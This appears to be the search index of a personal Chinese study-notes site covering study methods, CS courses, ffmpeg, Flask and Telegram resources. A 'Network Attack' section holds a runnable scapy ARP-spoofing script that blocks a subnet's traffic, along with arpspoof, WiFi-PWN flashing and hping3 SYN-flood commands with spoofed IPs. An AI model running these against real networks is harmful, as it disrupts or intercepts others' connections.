{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Track","text":"<p>\u738b\u57a0 - \u5f53\u7136\u6211\u5728\u626f\u6de1 \u9020\u5c31\u6211\u4eca\u5929\u7684\u7f16\u7a0b\u80fd\u529b\u548c\u6d1e\u5bdf\u529b\u7684\uff0c\u4e0d\u662f\u51e0\u767e\u4e07\u884c\u7684\u5927\u578b\u9879\u76ee\uff0c\u800c\u662f\u5c0f\u5230\u51e0\u884c\uff0c\u51e0\u5341\u884c\u4e4b\u77ed\u7684\u7ec3\u4e60\u3002\u4e0d\u8981\u5c0f\u770b\u4e86\u8fd9\u4e9b\u77ed\u5c0f\u7684\u4ee3\u7801\uff0c\u5b83\u4eec\u5c31\u662f\u7f16\u7a0b\u6700\u7cbe\u9ad3\u7684\u4e1c\u897f\u3002\u53cd\u53cd\u590d\u590d\u7422\u78e8\u8fd9\u4e9b\u77ed\u5c0f\u7684\u4ee3\u7801\uff0c\u4e0d\u65ad\u6539\u8fdb\u548c\u63d0\u70bc\u91cc\u9762\u7684\u7ed3\u6784\uff0c\u78e8\u783a\u81ea\u5df1\u7684\u601d\u7ef4\u3002\u9010\u6e10\u7684\uff0c\u4f60\u7684\u8ba4\u8bc6\u6c34\u5e73\u5c31\u8d85\u8d8a\u4e86\u8fd9\u4e9b\u51e0\u767e\u4e07\u884c\uff0c\u8ba9\u4eba\u5934\u75db\u7684\u9879\u76ee\u3002 </p>"},{"location":"#core","title":"Core","text":"<ul> <li> <p>Input \u2192 Process \u2192 Output</p> <ul> <li> <p>Input:</p> <ul> <li>\u542c\u529b</li> </ul> <p>SST \u9898\u5e93\u8bad\u7ec3\u3001Spotify \u9ad8\u8d28\u91cf\u64ad\u5ba2</p> <ul> <li>\u53e3\u8bed</li> </ul> <p>Firefly \u9898\u5e93\u5237\u9898\uff0c\u5355\u8bcd\u672c\u7ea0\u97f3\uff0c\u591a\u542c\u4fdd\u6301\u610f\u7fa4\u8bed\u611f</p> <ul> <li>\u5199\u4f5c</li> </ul> <p>Anki \u79ef\u6512\u4e0b\u7684\u9605\u8bfb\u77ed\u8bed\u548c\u8bcd\u6c47\u8fdb\u884c\u80cc\u8bf5\u4e0e\u7ea0\u6b63\uff0c\u8fdb\u884c\u8bed\u6cd5\u642d\u914d Anki \u518d\u80cc\u8bf5</p> <ul> <li>\u9605\u8bfb</li> </ul> <p>FireFly\u3001\u65b0\u6982\u5ff5\u9605\u8bfb\u8bfb\u672c\u3001\u9ad8\u8d28\u91cf\u7f8e\u56fd\u9ad8\u4e2d\u751f\u6587\u5b66\u3001\u5386\u53f2 Textbook\uff0cReading Firfly \u9898\u5e93\u7ffb\u8bd1\u7406\u89e3\u523b\u610f\u8bad\u7ec3\uff0cReadPaper \u4ee5\u53ca\u6c89\u6d78\u5f0f\u7ffb\u8bd1\u505a\u5bfc\u5165\u8fdb\u884c\u6bb5\u843d\u7cbe\u7ffb\uff0c\u7b14\u8bb0\u5f55\u5165 Anki \u4e2d\u8fdb\u884c\u6458\u7ed9\u51fa\u76f8\u5173\u5f15\u7528</p> </li> <li> <p>Process:</p> <ul> <li>\u505a\u9519\u7684\u9898\u76ee\u53cd\u590d\u5f55\u5165 MD \u9519\u9898\u672c\uff0c\u6253\u5370\u540e\u81ea\u884c\u6279\u6539</li> <li>\u91cd\u590d\uff0cRecursion\uff0c\u5927\u6a21\u5757\u62c6\u89e3\u5c0f\u6a21\u5757\u95ee\u9898\u9010\u4e00\u653b\u7834</li> <li>LLM \u5bf9\u4e8e\u5199\u4f5c\u4e0e\u9605\u8bfb\u8fdb\u884c\u5bfc\u5165\u5206\u6790\uff0c\u7ea0\u6b63\u8bed\u6cd5\u3001\u67e5\u8be2\u77ed\u8bed\u642d\u914d</li> <li>Anki \u6216\u767d\u7eb8\u65e9\u4e0a\u590d\u4e60\u5de9\u56fa\u3001\u665a\u4e0a\u7761\u524d\u8bb0\u5fc6\u590d\u4e60\uff0c\u7b2c\u4e8c\u5929\u518d\u56de\u5230\u539f\u8bed\u5883\u91cd\u7406\u89e3</li> <li>\u542c\u529b Spotify YouTube \u5b9a\u5411\u8bdd\u9898\u63d0\u53d6\u5b57\u5e55\u80cc\u8bf5\u4e0d\u719f\u6089\u7684\u5355\u8bcd\u91cd\u590d\u7406\u89e3\u5f55\u5165 Anki</li> </ul> </li> <li> <p>Output:</p> <ul> <li>\u5199\u4f5c</li> </ul> <p>\u8d39\u66fc\u5b66\u4e60\u6cd5\uff0c\u5c06\u9519\u9898\u672c\u4e0e Processed \u63d0\u70bc\u8fc7\u7684\u5355\u8bcd\u4e0e\u8bcd\u7ec4\u642d\u914d\uff0c\u601d\u8003\u8bb0\u5f55\u4e00\u4e9b\u65e5\u8bb0\u5230 Flomo\uff0c\u8bb0\u5f55\u60f3\u6cd5\u3001\u6280\u672f\u7b14\u8bb0\u81f3 Blog \u4e2d\uff0c\u6a21\u62df\u518d\u6b21\u6559\u4f1a\u522b\u4eba</p> <ul> <li>\u53e3\u8bed</li> </ul> <p>\u6a21\u62df\u8c08\u8bdd\u3001\u6f14\u8bb2\u6cd5\uff0c\u901a\u8fc7\u8bdd\u9898\u5047\u88c5\u81ea\u5df1\u5728\u8bb2\u8ff0\u4e00\u4e2a\u6545\u4e8b\uff0c\u4ece Anki \u4e0e\u7b14\u8bb0\u4e2d\u627e\u51fa\u8bcd\u6c47\u8fdb\u884c\u4e32\u8054\u8f93\u51fa\uff0c\u8fdb\u884c Record \u5f55\u5236\u540e\u56de\u653e\u81ea\u7ea0\u8bed\u901f\u4e0e\u8bed\u6cd5\u7b49\u95ee\u9898</p> </li> <li> <p>Tools</p> <ul> <li>\u535a\u5ba2\u9002\u5408\u6587\u79d1\u7c7b\u7684 Abstraction \u518d\u63d0\u70bc\u8f93\u51fa\uff0c\u8fdb\u884c\u6574\u5408\u4fee\u6539</li> <li>Flomo \u9002\u5408\u788e\u7247\u5316 Input \u8fdb\u884c Hash Tag \u6807\u6ce8\u6574\u7406\uff0c\u6d41\u6c34\u8d26\u5f0f\u53cd\u601d</li> <li>Notion \u9002\u5408\u65e5\u6708\u8fdb\u5ea6\u8ba1\u5212\u3001\u9519\u9898\u672c\u7684\u5efa\u7acb\u6253\u5370\u3001\u535a\u5ba2\u7684 Abstraction \u518d\u8f93\u51fa\u3001\u4eba\u751f\u3001\u516c\u53f8\u5927\u9879\u76ee\u8ba1\u5212\u7684\u5efa\u7acb</li> <li>Typora + Docsify + OneDrive \u8bb0\u5f55\u7406\u79d1\u89c4\u6574\u6280\u672f\u7b14\u8bb0\uff0cVisual Studio Code \u63a8\u9001\u81f3 Github</li> </ul> </li> <li>Doing One Thing at a Time</li> <li>Make a Plan \u2192 Recursion, Break in to small peieces.</li> <li>\u53cd\u8106\u5f31\uff1a\u81ea\u5df1\u4e3b\u52a8\u7ed9\u81ea\u5df1\u627e\u5b66\u4e60\u4e0a\u7684\u3001\u5065\u8eab\u4e0a\u7684\u82e6\u5934\u5403</li> </ul> </li> </ul>"},{"location":"#computer-science","title":"Computer Science","text":""},{"location":"#devops","title":"DevOps","text":"<ul> <li>A Practical Guide to Linux, Editors, and Shell</li> </ul>"},{"location":"#network","title":"Network","text":"<ul> <li>\u56fe\u89e3 HTTP</li> <li>Computer Networking: A Top-Down Approach</li> </ul>"},{"location":"#algorithm","title":"Algorithm","text":"<ul> <li>CSE 101</li> <li>Grokking Algorithms</li> </ul>"},{"location":"#design-model","title":"Design Model","text":"<ul> <li>A Philosophy of Software Design</li> <li>Grokking the System Design Interview</li> </ul>"},{"location":"#data-structures","title":"Data Structures","text":"<ul> <li>Discrete Math</li> <li>OI Wiki - Codewar</li> <li>CSE 100 - Review the knowledge of C and C++</li> </ul>"},{"location":"#distributed-systems","title":"Distributed Systems","text":"<ul> <li>MIT 6.004<ul> <li>CSE 140</li> <li>Computer Architecture - zyBooks</li> </ul> </li> <li>MIT 6.824 Distributed Systems</li> <li>MIT 6.S081 Operating System Engineering</li> <li>Computer Systems: A Programmer's Perspective</li> </ul>"},{"location":"#bootcamp","title":"Bootcamp","text":"<ul> <li>The Complete 2023 Web Development Bootcamp</li> <li>100 Days of Code: The Complete Python Pro Bootcamp for 2023</li> </ul>"},{"location":"ctf/networkattack/","title":"Network Attack","text":""},{"location":"ctf/networkattack/#arp-spoofing","title":"Arp Spoofing","text":""},{"location":"ctf/networkattack/#python-script","title":"Python Script","text":"<p>\u57fa\u4e8e\u767d\u540d\u5355\u5217\u8868\u8fdb\u884c ARP IP \u6bb5\u6d41\u91cf\u963b\u65ad</p> <pre><code>import scapy.all as scapy\nimport time\n\ndef scan_network(ip_range):\n    arp_request = scapy.ARP(pdst=ip_range)\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    arp_request_broadcast = broadcast / arp_request\n    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]\n    active_ips = []\n    for element in answered_list:\n        active_ips.append(element[1].psrc)\n    return active_ips\n\ndef get_mac(ip):\n    arp_request = scapy.ARP(pdst=ip)\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    arp_request_broadcast = broadcast / arp_request\n    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]\n    if answered_list:\n        return answered_list[0][1].hwsrc\n    else:\n        return None\n\ndef spoof(target_ip, spoof_ip):\n    target_mac = get_mac(target_ip)\n    if target_mac is not None:\n        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)\n        scapy.send(packet, verbose=False)\n\ndef restore(destination_ip, source_ip):\n    destination_mac = get_mac(destination_ip)\n    source_mac = get_mac(source_ip)\n    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)\n    scapy.send(packet, verbose=False)\n\n# Replace these with the actual IP range and exclusion list\nip_range = \"192.168.1.0/24\"\ngateway_ip = \"192.168.1.1\"\nexclusion_list = [\"192.168.1.1\", \"192.168.1.4\", \"192.168.1.6\"]\n\ntry:\n    active_ips = scan_network(ip_range)\n    target_ips = [ip for ip in active_ips if ip not in exclusion_list]\n    sent_packets_count = 0\n    print(active_ips)\n    while True:\n        for target_ip in target_ips:\n            spoof(target_ip, gateway_ip)\n            spoof(gateway_ip, target_ip)\n            sent_packets_count = sent_packets_count + 2\n            print(f\"\\\\r[*] Packets Sent to {target_ip} -&gt; \" + str(sent_packets_count), end=\"\")\n        time.sleep(1) # Waits for two seconds\n\nexcept KeyboardInterrupt:\n    print(\"\\\\nCtrl + C pressed.............Exiting\")\n    for target_ip in target_ips:\n        restore(gateway_ip, target_ip)\n        restore(target_ip, gateway_ip)\n    print(\"[+] Arp Spoof Stopped\")\n</code></pre>"},{"location":"ctf/networkattack/#quick-spoofing-on-linux","title":"Quick spoofing on Linux","text":"<pre><code>apt install dsniff\nnmap -sP 192.168.86.1/26\nsysctl -w net.ipv4.ip_forward=0\nsudo arpspoof -i wlan0 -t 192.168.86.30 -r 192.168.86.1\n</code></pre>"},{"location":"ctf/networkattack/#wifi-clone","title":"WIFI Clone","text":""},{"location":"ctf/networkattack/#esp8266-mcu-wifi-pwn","title":"ESP8266 MCU \u70e7\u5f55 WIFI-PWN","text":"<pre><code>pip install esptool\nesptool.py --port COM5 erase_flash\nesptool.py --port COM5 --baud 115200 write_flash -fm dio -fs 32m 0x00000 NODEMCU.bin\n</code></pre>"},{"location":"ctf/networkattack/#tcp-syn-flood","title":"TCP SYN Flood","text":"<p>\u4e3b\u8981\u4f7f\u7528 HPING3 \u5de5\u5177\u8fdb\u884c DOS \u653b\u51fb\uff1a\u4f2a\u9020 IP\u3001\u76ee\u6807 IP</p> <pre><code>hping3 -c 5000 -d 1024 -S -w 64 -p 21 --flood -a 192.168.10.254 192.168.10.120\n</code></pre>"},{"location":"devops/ffmpeg/","title":"FFMPEG","text":""},{"location":"devops/ffmpeg/#shortcuts","title":"Shortcuts","text":""},{"location":"devops/ffmpeg/#_1","title":"\u7f51\u7edc\u4e32\u6d41\u4fdd\u5b58","text":"<pre><code>ffmpeg -i \"&lt;https://somem3u8linkfromwebsite.master.m3u8&gt;\" -c:v libx264 -preset slow -crf 22 \"save.mp4\"\n</code></pre>"},{"location":"devops/ffmpeg/#_2","title":"\u89c6\u9891\u7247\u6bb5\u88c1\u526a","text":"<pre><code>ffmpeg -ss 00:00:00 -t 00:00:30 -i input.mp4 -vcodec copy -acodec copy output.mp4\n</code></pre>"},{"location":"devops/ffmpeg/#_3","title":"\u6309\u7167\u89c6\u9891\u5e8f\u53f7\u5408\u5e76","text":"<p>\u5728\u6587\u4ef6\u5939\u4e0b\u6309\u7167\u6570\u5b57\u6392\u5e8f\u6587\u4ef6\u540e\u76f4\u63a5\u5408\u5e76\uff0c\u9002\u7528\u4e8e m3u8 \u7b49\u6587\u4ef6\u88ab\u5206\u6bb5\u4fdd\u62a4\u540e\u7684\u5408\u5e76\u91cd\u7ec4</p> <pre><code>ffmpeg -safe 0 -f concat -i &lt;(find \"$PWD\" -name '*.mp4' -printf \"file '%p'\\\\\\\\n\" | sort) -c copy output.mp4\n</code></pre>"},{"location":"devops/ffmpeg/#_4","title":"\u89c6\u9891\u6279\u91cf\u8f6c\u6362\u683c\u5f0f","text":"<pre><code>for i in *.flv;\n  do name=`echo \"$i\" | cut -d'.' -f1`\n  echo \"$name\"\n  ffmpeg -i \"$i\" \"${name}.mp4\"\ndone\n</code></pre>"},{"location":"devops/ffmpeg/#mp4","title":"\u97f3\u9891\u5d4c\u5165 MP4 \u89c6\u9891","text":"<pre><code>ffmpeg -i input.mp4 -i input.mp3 -c copy -map 0:v:0 -map 1:a:0 output.mp4 \n</code></pre>"},{"location":"devops/ffmpeg/#mp4-srt","title":"MP4 \u5e95\u90e8\u5d4c\u5165 SRT \u5b57\u5e55","text":"<pre><code>ffmpeg -i input.mp4 -vf subtitles=subtitles.srt output.mp4\n</code></pre>"},{"location":"devops/ffmpeg/#_5","title":"\u6709\u635f\u538b\u7f29","text":"<pre><code>ffmpeg -i input.mp4 -c:v libx264 -tag:v avc1 -movflags faststart -crf 30 -preset superfast output.mp4\n</code></pre> <p><code>-c:v libx264</code> \u4e3b\u6d41\u3001\u9ad8\u6548\u7684 H.264 \u538b\u7f29\u7f16\u7801\u3002</p> <p><code>-movflags faststart</code> \u5143\u6570\u636e\u524d\u7f6e\uff0c\u89c6\u9891\u8fd8\u672a\u5b8c\u5168\u4e0b\u8f7d\u65f6\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u64ad\u653e\u3002</p> <p><code>-crf 30</code> \u52a8\u6001\u7801\u5f8b\uff0c\u5927\u5e45\u538b\u7f29\u7684\u5173\u952e\u3002</p> <p><code>-preset superfast</code> \u63d0\u5347\u538b\u7f29\u901f\u5ea6\u3002</p>"},{"location":"devops/ffmpeg/#automater","title":"Automater","text":"<p>\u5efa\u7acb\u4f18\u5316\u5de5\u4f5c\u6d41\uff0c\u591a\u6587\u4ef6\u9009\u4e2d\u5373\u53ef\u538b\u7f29\uff0c\u8be5\u65b9\u6848\u53ef\u7528\u4e8e\u6240\u6709\u811a\u672c:</p> <pre><code>#!/bin/zsh\nfor f in \"$@\"\ndo\n  /opt/homebrew/bin/ffmpeg -i \"$f\" -c:v libx264 -crf 30 -r 24 -movflags faststart -c:a aac -b:a 128k -preset superfast \"${f%.*}_compressed.mp4\"\ndone\n</code></pre>"},{"location":"devops/ffmpeg/#macos-m","title":"MacOS M \u7cfb\u5217\u82af\u7247\u63a8\u7406\u52a0\u901f","text":"<ul> <li>H.264</li> </ul> <pre><code>-c:v h264_videotoolbox\n</code></pre> <ul> <li>HEVC/H.265 </li> </ul> <pre><code>-c:v hevc_videotoolbox\n</code></pre> <pre><code>ffmpeg -i input.mov -c:v h264_videotoolbox output.mp4\n</code></pre> <p>\u5173\u4e8e\u5176\u89e3\u7801\u5668\u5176\u4ed6\u9009\u9879\uff1a</p> <pre><code>ffmpeg -h encoder=h264_videotoolbox \nffmpeg -h encoder=hevc_videotoolbox\n</code></pre> <p>\u7f3a\u70b9\u4e3a\u8be5\u7c7b\u89e3\u7801\u5668\u5e76\u4e0d\u652f\u6301 crf \u9009\u9879\uff0c\u53ea\u80fd\u4f7f\u7528 <code>-b:v</code> \u53bb\u8bbe\u7f6e\u7801\u7387\uff1a<code>-b:v 6000k.</code></p>"},{"location":"devops/gfw/","title":"The Great Firewall","text":""},{"location":"devops/gfw/#cloudflare-warp","title":"Cloudflare WARP<sup>1</sup>","text":"<p><code>wgcf.exe</code> \u4e0b\u8f7d\u5b89\u88c5\uff1awgcf</p> <pre><code>.\\wgcf.exe register\n.\\wgcf.exe generate\n</code></pre> <p>\u6700\u540e\u628a\u6240\u6709\u4ee3\u7406\u670d\u52a1\u5668\u5173\u95ed\uff0c\u8fdb\u884c IP \u6d4b\u901f\u8c03\u4f18</p> <p>warp.7z</p> <p>\u6267\u884c\u76f8\u5173 .bat \u811a\u672c\u67e5\u770b\u751f\u6210\u7684 csv \u8868\u683c\u6570\u636e\uff0c\u66ff\u6362 Endpoint \u5173\u952e\u8bcd</p> <pre><code>qrencode -t ansiutf8 &lt; wgcf-profile.conf\n</code></pre> <ol> <li> <p>\u5728 WireGuard \u5ba2\u6237\u7aef\u4e0a\u4f7f\u7528 CloudFlare WARP \u8282\u70b9 \u21a9</p> </li> </ol>"},{"location":"devops/prompts/","title":"ChatGPT Prompts","text":""},{"location":"devops/prompts/#anki","title":"Anki \u5355\u8bcd\u5361","text":"<pre><code>hydrogen\nshipwreck\nartifacts\nhistorians\ncastles\nintimidate\nmeasures\nbiology\njournalism\ncrisis\ncircumstances\nextracted\nchemically\nseminars\ntutorials\nsteadily\nincorporating\nlinguistics\nauditions\nchoir\neradicated\nsoaking up the rainwater\ncanteen\nvariety\ncommissioner\napportion\nfunds\nauthorities\nathletic\nmandatory\nassociated\noperating\npoetry\nscientific\nopportunities\nmomentum\ncafeteria\nthroughout\nintelligence\nuntapped\nsunray\nphenomenal\nhung\nlargest\ntheater\ntutorials\ncontinuous assessments examinations\nsoutheastern\npharmacy\nassessed\nthorough\ninsightful\nsophisticated\nelaborated\nrepresentatives\nleisure\ncolossal renovation\n\nReformat the vocabulary list (voc), but do not alter my existing format. Simply output the following format in raw Markdown.\n\n```md\n*hydrogen\n**\u6c22\uff0cHydrogen is the lightest and most abundant element in the universe.\n\n*shipwreck\n**\u6c89\u8239\uff0cThe shipwreck was discovered by a team of marine archaeologists.\n```\n</code></pre>"},{"location":"handbook/csplan/","title":"CS Study Plan","text":"<p>Matt Rickard Hire for slope, not Y-Intercept.</p>"},{"location":"handbook/csplan/#stanford","title":"Stanford","text":"Course Description CS106A CS106B YouTube Lecture CS107 YouTube Lecture CS103 MIT Mathematics for Computer Science or Coursera CS161 Design and Analysis, Part 1  + Design and Analysis, Part 2 CS110 CS145 edX Compilers CS143 CS144 YouTube Lecture Video CS140 UCB https://cs162.org/ + YouTube Lecture Video Elective CS246 CS253 CS255 <ul> <li>Use https://online.stanford.edu to research the course you study first</li> <li>Check https://www.edx.org/school/stanfordonline for what you are interesting for</li> </ul>"},{"location":"handbook/csplan/#uc-san-diego","title":"UC San Diego","text":"Course Description CSE 15L A Practical Guide to Linux Commands, Editors, and Shell Programming CSE 20 Discrete Mathematics and its Applications from Kenneth Rosen &amp; Daniel Solow - How to Read and Do Proofs CSE 21 Google Drive Backup CSE 30 Stepik open course, can't use the pi-cluster CSE 140 Google Drive Backup, zybook extend one year CSE 140L Google Drive Backup CSE 100 Stepik rysnc reading CSE 101 Google Drive Backup CSE 105 Google Drive Backup MGT 172 Google Drive Backup SOCI 117 Google Drive Backup <ul> <li>Try use Latex to finish homework.</li> <li>Check your alterative textbook database before study.</li> </ul>"},{"location":"handbook/csplan/#uc-santa-cruz","title":"UC Santa Cruz","text":"Course Description CSE 130 Principles of Computer Systems Design CSE 120 Computer Architecture CSE 102 Introduction to Analysis of Algorithms CSE 185S Technical Writing for Computer Science and Engineering CSE 107 Probability and Statistics for Engineers CSE 116 Introduction to Functional Programming Elective Elective Elective Capstone elective Elective CSE 103 Computational Models"},{"location":"handbook/telegram/","title":"Telegram Guide","text":"<p>Immanuel Kant Freedom is not letting you do whatever you wanna but teaching you not to do the things you don't wanna do.<sup>1</sup></p>"},{"location":"handbook/telegram/#seo","title":"SEO","text":"<ul> <li>TGSCAN</li> </ul> <p>\u5168 Telegram \u9891\u9053\u673a\u5668\u4eba\u7fa4\u804a\u641c\u7d22</p> <ul> <li>Telemetr.io</li> </ul> <p>Google <code>site:telemetr.io \u8d44\u6e90\u641c\u7d22\u5173\u952e\u8bcd</code></p> <ul> <li>\u6700\u5f3a\u8d44\u6e90\u641c\u7d22\u5f15\u64ce</li> </ul> <p>\u51e0\u4e2a\u6700\u5927\u7684\u7535\u5b50\u4e66\u3001\u6559\u7a0b\u3001\u7834\u89e3\u8f6f\u4ef6\u5206\u4eab\u9891\u9053\u7ec4\u6210\u7684\u641c\u7d22\u5f15\u64ce</p>"},{"location":"handbook/telegram/#bots","title":"Bots","text":"<p>@myidbot</p> <p>@scihubot</p> <p>@CatdlBot</p> <p>@VmomoVBot</p> <p>@QuotLyBot</p> <p>@getletbot</p> <p>@Music163bot</p> <p>@bingdict_bot</p> <p>@zlibrary2bot</p> <p>@burn_hair_bot</p> <p>@web2album_bot</p> <p>@yihong0618_bot</p> <p>@yellow_gif_bot</p> <p>@PolarisseekBot</p> <p>@sgk2023_03_30bot</p> <p>@CopilotOfficialBot</p> <p>@ayaka_insights_bot</p> <p>@reverse_image_search_bot</p>"},{"location":"handbook/telegram/#tech","title":"Tech","text":"<ul> <li>\u82b1\u679c\u5c71\u5927\u5723\u8fdc\u7a0b\u5de5\u4f5c</li> <li>PagerMaid-Modify Update</li> </ul>"},{"location":"handbook/telegram/#runology","title":"Runology","text":"<ul> <li>\u6d41\u6d6a\u9632\u533a</li> </ul> <p>Reddit \u8bba\u575b\u5206\u652f\u8ba8\u8bba\u793e\u533a @china_irl</p> <ul> <li>Runology Group</li> </ul> <p>\u4e3b\u653b\u6da6\u5b66\u5206\u4eab\uff0c\u7fa4\u91cc\u5f88\u591a\u6da6\u5b66\u7406\u8bba\u5bb6\u53ef\u4ee5\u54a8\u8be2</p>"},{"location":"handbook/telegram/#sociology","title":"Sociology","text":"<ul> <li>Iyouport</li> </ul> <p>\u81ea\u7531\u6e2f\u65b0\u95fb\u5e2e\uff0c\u793e\u4f1a\u5b66\u89c2\u5bdf\u4e0e\u89e3\u6784</p> <ul> <li>TomBen\u2019s Web Excursions</li> </ul> <p>Social Science Ph.D. - \u793e\u4f1a\u77db\u76fe\u8bba\u6587\u89e3\u8bfb\uff0c\u5b9e\u9a8c\u6570\u636e\u5206\u4eab</p>"},{"location":"handbook/telegram/#entertainment","title":"Entertainment","text":"<ul> <li>\u5c0f\u7ea2\u4e66\u4e00\u77a5</li> </ul>"},{"location":"handbook/telegram/#ai","title":"AI","text":"<ul> <li>AI Copilot Channel</li> </ul> <ol> <li> <p>Immanuel Kant \u5bf9\u4e8e\u81ea\u7531\u7684\u5b9a\u4e49 \u21a9</p> </li> </ol>"},{"location":"python/flask/1.0/","title":"1.0 \u5165\u95e8","text":""},{"location":"python/flask/1.0/#theory","title":"Theory","text":"<ul> <li>Client-Side = Restaurant</li> <li>Server = Kitchen</li> <li>Database = Larder</li> </ul> <p>\u7f51\u7ad9\u5c31\u50cf\u4e00\u5bb6\u9910\u5385\uff0c\u670d\u52a1\u5458\u548c\u53a8\u5e08\u4ece\u6570\u636e\u5e93\u4e2d\u62ff\u53d6\u6570\u636e\u8fdb\u884c\u52a0\u5de5\u6e32\u67d3\u91cd\u65b0\u7ec4\u5408\u6210\u65b0\u7684 HTML CSS \u548c JS \u6587\u4ef6\u5448\u73b0\u7ed9\u7528\u6237</p> <ul> <li>Framework \u548c Library \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u4f60\u5fc5\u987b\u6309\u7167\u6846\u67b6\u7684\u89c4\u5219\u8fdb\u884c\u7f16\u7a0b</li> </ul>"},{"location":"python/flask/1.0/#basics","title":"Basics","text":"Flask Import<pre><code>from flask import Flask\n\napp = Flask(__name__)\n\nprint(__name__) # (1)!\n</code></pre> <p>Flask \u5f53\u4e2d\u7684 <code>__name__</code> \u7528\u4e8e\u786e\u5b9a\u5e94\u7528\u5f53\u524d\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u5982\u679c\u76f4\u63a5\u6253\u5370 <code>__name__</code> \u4f1a\u663e\u793a <code>__main__</code> </p> <p><code>__main__</code> is the name of the scope in which top-level code executes. A module's <code>__name__</code> is set equal to <code>__main__</code> when read from standard input, a script, or from an interactive prompt.</p> <pre><code>if __name__ = \"__main__\":\n    main()\n</code></pre> <p>\u53ea\u6709\u5f53\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u811a\u672c\u8fd0\u884c\u65f6\u624d\u4f1a\u6267\u884c</p>"},{"location":"python/flask/1.0/#_1","title":"\u8def\u7531","text":"<p>\u5ba2\u6237\u7aef\uff08\u4f8b\u5982 Web \u6d4f\u89c8\u5668\uff09\u628a\u8bf7\u6c42\u53d1\u9001\u7ed9 Web \u670d\u52a1\u5668\uff0cWeb \u670d\u52a1\u5668\u518d\u628a\u8bf7\u6c42\u53d1\u9001\u7ed9 Flask \u5e94\u7528\u5b9e\u4f8b\u3002\u5e94\u7528\u5b9e\u4f8b\u9700\u8981\u77e5\u9053\u5bf9\u6bcf\u4e2a URL \u7684\u8bf7\u6c42\u8981\u8fd0\u884c\u54ea\u4e9b\u4ee3\u7801\uff0c\u6240\u4ee5\u4fdd\u5b58\u4e86\u4e00\u4e2a URL \u5230 Python \u51fd\u6570\u7684\u6620\u5c04\u5173\u7cfb\u3002\u5904\u7406 URL \u548c\u51fd\u6570\u4e4b\u95f4\u5173\u7cfb\u7684\u7a0b\u5e8f\u79f0\u4e3a\u8def\u7531\u3002</p> <pre><code>@app.route('/')\ndef index():\n    return 'Hello World!'\n\n@app.route('/user/&lt;name&gt;')\ndef user(name):\n    return 'Hello, {}!'.format(name)\n</code></pre> <p>\u5c16\u62ec\u53f7\u91cc\u7684\u5185\u5bb9\u5c31\u662f\u52a8\u6001\u90e8\u5206\uff0cFlask \u4f1a\u5c06\u52a8\u6001\u90e8\u5206\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u51fd\u6570\uff1a</p> <p>\u8def\u7531 <code>/user/&lt;int:id&gt;</code> \u53ea\u4f1a\u5339\u914d\u52a8\u6001\u7247\u6bb5\uff0c\u8def\u7531\u4e2d\u652f\u6301 string, float \u548c path \u7c7b\u578b</p>"},{"location":"python/flask/1.0/#python-decorators","title":"Python Decorators","text":"<pre><code># Functions can be nested in other functions\n\ndef outer_function():\n    print(\"I'm outer\")\n\n    def nested_function():\n        print(\"I'm inner\")\n\n    nested_function()  \nouter_function()\n\n# Functions can be returned from other functions\n\ndef outer_function():\n    print(\"I'm outer\")\n\n    def nested_function():\n        print(\"I'm inner\")\n    return nested_function\n\ninner_function = outer_function()\ninner_function()\n</code></pre>"},{"location":"python/flask/1.0/#_2","title":"\u542f\u52a8\u65b9\u6cd5","text":"<p>\u6307\u4ee4\u884c\u542f\u52a8\uff1a</p> <pre><code>set FLASK_APP=hello.py\nflask run\n</code></pre> <p>\u5355\u5143\u6d4b\u8bd5\u8c03\u8bd5\uff1a</p> <pre><code>set FLASK_APP=hello.py\nset FLASK_DEBUG=1\nflask run\n</code></pre> <p>\u6216\u5728\u4ee3\u7801\u5185\u90e8\u76f4\u63a5\u5b9a\u4e49\u8c03\u8bd5</p> <pre><code>if __name__ == '__main__':\n    app.run(debug=True)\n</code></pre> <p>\u91cd\u8f7d\u5668\u548c\u8c03\u8bd5\u5668\u4f1a\u81ea\u52a8\u68c0\u6d4b\u4ee3\u7801\u53d8\u52a8\u5728 Web \u7aef\u629b\u51fa\u5f02\u5e38</p> <p><code>flask run</code> \u7684\u8be6\u7ec6\u62d3\u5c55\u53c2\u6570\u76f4\u63a5\u8f93\u5165 <code>flask --help</code> \u76f4\u63a5\u67e5\u770b\u5373\u53ef</p>"},{"location":"system/c_functions/","title":"2.2 C Functions","text":""},{"location":"system/c_functions/#wed-lecture","title":"Wed Lecture","text":"<ol> <li>\u51fd\u6570\u7684\u5b58\u5728\u662f\u4e3a\u4e86\u53ef\u8bfb\u6027\uff0c\u53ef\u79fb\u690d\u6027\uff0c\u53ef\u7ef4\u62a4\u6027\u7b49\uff0c\u4e5f\u53ef\u5728\u8f6f\u4ef6\u5de5\u7a0b\u91cd\u6784\u8fc7\u7a0b\u4e2d\u7528\u4e8e\u51cf\u5c11\u91cd\u590d\u4ee3\u7801\u91cf\u4e0e\u5185\u5b58\uff0c\u63d0\u4f9b\u5176\u4ed6\u6a21\u5757\u91cd\u590d\u8c03\u7528\uff0c\u540c\u65f6\u5c06\u8bed\u53e5\u62bd\u8c61\u5316</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u91c7\u7528\u4ee5\u4e0b\u51fd\u6570\u5b9a\u4e49\u660e\u786e\u7684\u5165\u53e3\u70b9\uff0c\u4ece\u7528\u6237\u7f16\u5199\u7684\u4ee3\u7801\u5230\u5185\u6838\u4e2d\uff0c\u6b64\u7c7b\u51fd\u6570\u79f0\u4e3a\u7cfb\u7edf\u8c03\u7528\u3002 \u5728 main \u51fd\u6570\u4e2d <code>return 0;</code> 